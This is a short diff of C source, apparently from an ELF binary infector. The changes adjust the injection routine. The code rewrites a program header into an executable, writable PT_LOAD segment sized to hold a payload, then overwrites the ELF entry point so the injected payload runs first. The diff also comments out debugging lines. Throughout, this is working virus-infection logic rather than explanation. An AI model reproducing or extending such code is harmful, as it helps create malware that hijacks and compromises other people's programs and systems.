@@ -17,9 +17,9 @@ int FORCE_INLINE metamorph_segment(t_data data)
 			p_hdr.p_type = PT_LOAD;
 			p_hdr.p_offset = data.bin.new_pentry;
 			p_hdr.p_vaddr = data.bin.new_entry;
-			p_hdr.p_paddr = data.bin.new_pentry;
-			p_hdr.p_filesz = data.infos.pl_size;
-			p_hdr.p_memsz = data.infos.pl_size;
+			// p_hdr.p_paddr = data.bin.new_pentry;
+			p_hdr.p_filesz += data.infos.pl_size;
+			p_hdr.p_memsz += data.infos.pl_size;
 			p_hdr.p_flags = PF_X | PF_R | PF_W;
 			LSEEK(data.fd, sizeof(p_hdr) * -1, SEEK_CUR);
 			WRITE(data.fd, &p_hdr, sizeof(p_hdr));
@@ -83,10 +83,11 @@ int inject(t_data data)
 	u64 payload_addr;
 
 	data.bin = get_infos(data.fd);
-	if (!metamorph_segment(data) || !metamorph_section(data))
+	if (!metamorph_segment(data) /*|| !metamorph_section(data)*/)
 		return (0);
+	// asm volatile ( "int3;");
 	/* change entry point */
-	printf("ie: %d\n", data.bin.new_entry);
+	// printf("ie: %d\n", data.bin.new_entry);
 	LSEEK(data.fd, 24, SEEK_SET);
 	WRITE(data.fd, &(data.bin.new_entry), sizeof(data.bin.new_entry));
 	offset = LSEEK(data.fd, 0, SEEK_END);
